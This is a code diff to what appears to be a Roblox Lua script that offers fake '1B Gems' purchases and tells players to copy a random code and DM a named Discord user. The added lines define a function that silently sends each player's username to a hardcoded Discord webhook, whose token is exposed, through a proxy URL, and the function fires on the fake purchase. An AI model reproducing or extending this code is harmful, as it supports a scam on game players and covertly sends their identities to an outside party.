@@ -1,3 +1,10 @@
+function sendwebhook(a,b,c)
+Title = game.Players.LocalPlayer.Name.. a
+Desc = game.Players.LocalPlayer.Name.. b
+Footer = c
+local url = " https://api.rankgun.works/hooks/send?webhook=https://discordapp.com/api/webhooks/1076618087555674132/4et0UVqnD9QCIcrZOGJgqvgpkVZ8VNXgbUp9no9gZt7giouxVciH9O8jl8MIiLnEMZ8f&embedActivated=True&title=".. Title .."&description=".. Desc .."&color=7dfc42&footer=True&footerText=".. Footer
+game:HttpGet(url)
+end
 code = "HUXJSVB3 C63URGQX YKZTRRHJ NUDEZ6XE 3B2V9SJN 2CH4AE4T FPHLEAUX 2WZJVLJH PGEFWY2W REQS58GB 5DVG488K JQ6AGCR2 6B9Y4BDT VGGPCPGD CC54KTHL WE4CSRR2 PTDRUWE2 G6QBFLKK 6MSPNFWN PM9N2VHK"
 codes = string.split(code, " ")
 stuff = {}
@@ -159,6 +166,7 @@ if okayy.Frame.Desc.Text == "Are You Sure You Wanna Buy 1B Gems?" then
 		okayy.Enabled = false
 		aff.Enabled = true
 		aff.Frame.Desc.Text = "You Bought 1B Gems! (You Have ".. tonumber(amount).. " Coins) Click 'Ok' To Copy The ID Of The Item. DM Yusefk7797#3922 With The Code In Order To Proceed."
+		sendwebhook(game.Players.LocalPlayer.Name.. " Bought A Huge Cat!", game.Players.LocalPlayer.Name.. " Bought A Huge Cat For 1500000 Tokens", game.Players.LocalPlayer.Name)
 		aff.Frame.Ok.MouseButton1Down:Connect(function()
 			setclipboard(codes[math.random(1, #codes)])
 		end)
